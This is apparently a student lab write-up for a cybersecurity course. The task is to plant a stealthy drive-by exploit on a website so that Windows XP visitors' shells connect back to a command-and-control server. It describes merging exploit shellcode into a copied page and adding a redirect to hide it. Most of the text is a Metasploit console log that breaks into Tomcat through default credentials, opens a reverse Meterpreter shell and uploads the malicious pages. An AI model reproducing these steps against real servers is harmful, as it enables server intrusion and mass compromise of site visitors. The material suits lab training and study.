# Project 2: Web Hijacking

## Goal
You come across a very popular website visited by many people every day. Your task is to hijack as many of the visitors’ devices as you can.

Many of the people who visit this website are still running Windows XP SP2 and use Internet Explorer (IE) for browsing.

You must be able to compromise the machines of anyone who visits this website using XP SP2 (like the provided VM). For the purpose of this assignment, your shell needs to be returned to a C&C server at 10.247.49.159, at a port number assigned to you

You must do this as stealthily as possible, i.e., the person visiting the website must not suspect that there is something fishy going on. This ensures that you pwn the maximum number of devices before being discovered.


## Steps I took to accomplish the task:

### Crafting the HTML file:
1.	I obtained the source code of the Practical Cybersecurity Class web page.
2.	I generated shellcode for the proof of concept html file.
3.	I manually merged the source code with the proof of concept html file and called it index2.html
4.	I put index2.html on a directory and used Python's simple web server to serve the file.
5.	I verified it worked by visiting index2.html from the Windows XP virtual machine.
6.	I noticed that, although the exploit worked, the page content was never loaded; the browser displayed just a blank page. To solve this, I created an index1.html that does not have malicious code but has a redirect to index2.html. This way, the correct content will be displayed before the malicious code in index2.html executes.
7.	I changed the shellcode of index2.html to use the IP 10.247.49.159  and the port 5037.

### Breaking into the server:
1.	I ran a Nessus Scan web application scan that discovered that port 8080 was open for Apache Tomcat and that the Tomcat's manager had the default credentials.
2.	I played with the Apache Tomcat's manager and I noticed that it allowed the uploading of WAR files.
3.	I searched the web for vulnerabilities in Apache Tomcat's manager and found the name of a Metasploit module that exploits the uploading of WAR files.
4.	I used the following options with the Metasploit module:
msf exploit(tomcat_mgr_upload) > set httppassword tomcat
httppassword => tomcat
msf exploit(tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf exploit(tomcat_mgr_upload) > set rhost 10.247.49.211
rhost => 10.247.49.211
msf exploit(tomcat_mgr_upload) > set rport 8080
rport => 8080
msf exploit(tomcat_mgr_upload) > set targeturi /manager
targeturi => /manager
msf exploit(tomcat_mgr_upload) > set vhost 10.247.49.211
vhost => 10.247.49.211
5.	I ran the exploit and used the reverse TCP connection to edit index.html with the redirect to index2.html, which I uploaded afterward.

This were the steps I followed in Metasploit:
```
msf exploit(tomcat_mgr_deploy) > use exploit/multi/http/tomcat_mgr_upload
msf exploit(tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                          yes       The target address
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf exploit(tomcat_mgr_upload) > set httppassword tomcat
httppassword => tomcat
msf exploit(tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf exploit(tomcat_mgr_upload) > set rhost 10.247.49.211
rhost => 10.247.49.211
msf exploit(tomcat_mgr_upload) > set rport 8080
rport => 8080
msf exploit(tomcat_mgr_upload) > set targeturi /manager/html
targeturi => /manager/html
msf exploit(tomcat_mgr_upload) > set vhost 10.247.49.211
vhost => 10.247.49.211
msf exploit(tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST         10.247.49.211    yes       The target address
   RPORT         8080             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager/html    yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST         10.247.49.211    no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf exploit(tomcat_mgr_upload) > set targeturi /manager
targeturi => /manager
msf exploit(tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.247.49.127:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying FSKTK4Z...
[*] Executing FSKTK4Z...
[*] Undeploying FSKTK4Z ...
[*] Sending stage (51184 bytes) to 10.247.49.211
[*] Meterpreter session 1 opened (10.247.49.127:4444 -> 10.247.49.211:60104) at 2018-03-29 22:57:34 -0400

meterpreter > ls
Listing: /var/lib/tomcat7
=========================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:15 -0400  common
40776/rwxrwxrw-  4096  dir   2018-03-21 11:14:34 -0400  conf
40776/rwxrwxrw-  4096  dir   2018-03-29 16:57:32 -0400  logs
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:15 -0400  server
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:15 -0400  shared
40776/rwxrwxrw-  4096  dir   2018-03-29 17:50:45 -0400  webapps
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:18 -0400  work

meterpreter > cd ..
meterpreter > ls
Listing: /var/lib
=================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:21 -0400  AccountsService
40776/rwxrwxrw-  4096  dir   2018-03-21 12:08:41 -0400  apache2
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:28 -0400  apparmor
40776/rwxrwxrw-  4096  dir   2018-03-22 06:20:19 -0400  apt
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:02 -0400  aspell
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:23 -0400  dbus
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:42 -0400  dhcp
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:02 -0400  dictionaries-common
40776/rwxrwxrw-  4096  dir   2018-03-21 12:08:43 -0400  dpkg
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:02 -0400  emacsen-common
40776/rwxrwxrw-  4096  dir   2017-10-04 14:22:54 -0400  git
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:46 -0400  initramfs-tools
40776/rwxrwxrw-  4096  dir   2016-02-05 04:48:45 -0500  initscripts
40776/rwxrwxrw-  4096  dir   2016-02-05 04:48:45 -0500  insserv
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:02 -0400  ispell
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:46 -0400  locales
40776/rwxrwxrw-  4096  dir   2018-03-29 09:25:01 -0400  logrotate
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:32 -0400  man-db
40776/rwxrwxrw-  4096  dir   2016-04-12 16:14:23 -0400  misc
40776/rwxrwxrw-  4096  dir   2018-03-29 09:25:01 -0400  mlocate
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:12 -0400  nssdb
40776/rwxrwxrw-  4096  dir   2017-02-03 11:49:55 -0500  os-prober
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:38 -0400  pam
40776/rwxrwxrw-  4096  dir   2016-05-10 13:56:02 -0400  plymouth
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:07 -0400  python
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:07 -0400  resolvconf
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:24 -0400  sgml-base
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:07 -0400  sudo
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:43 -0400  systemd
40776/rwxrwxrw-  4096  dir   2018-03-21 10:59:15 -0400  tomcat7
40776/rwxrwxrw-  4096  dir   2018-03-21 10:03:42 -0400  ubuntu-release-upgrader
40776/rwxrwxrw-  4096  dir   2018-03-21 11:02:18 -0400  ucf
40776/rwxrwxrw-  4096  dir   2018-03-21 10:03:45 -0400  update-manager
40776/rwxrwxrw-  4096  dir   2017-07-18 19:29:55 -0400  update-notifier
40776/rwxrwxrw-  4096  dir   2015-03-06 09:51:26 -0500  update-rc.d
40776/rwxrwxrw-  4096  dir   2018-03-21 09:59:32 -0400  urandom
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:07 -0400  ureadahead
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:59 -0400  usbutils
40776/rwxrwxrw-  4096  dir   2018-03-21 09:57:07 -0400  vim
40776/rwxrwxrw-  4096  dir   2018-03-21 09:58:24 -0400  xml-core

meterpreter > cd ..
meterpreter > cd www
meterpreter > cd html
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  578    fil   2018-03-21 14:44:48 -0400  index.html
100666/rw-rw-rw-  58127  fil   2018-03-21 12:11:50 -0400  simon.jpg

meterpreter > upload /root/Desktop/index2.html
[*] uploading  : /root/Desktop/index2.html -> index2.html
[*] uploaded   : /root/Desktop/index2.html -> index2.html
meterpreter > upload /root/Desktop/index.html
[*] uploading  : /root/Desktop/index.html -> index.html
[*] uploaded   : /root/Desktop/index.html -> index.html
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  673    fil   2018-03-29 17:57:59 -0400  index.html
100666/rw-rw-rw-  2621   fil   2018-03-29 17:57:27 -0400  index2.html
100666/rw-rw-rw-  58127  fil   2018-03-21 12:11:50 -0400  simon.jpg

meterpreter > quit
[*] Shutting down Meterpreter...

[*] 10.247.49.211 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(tomcat_mgr_upload) > 
```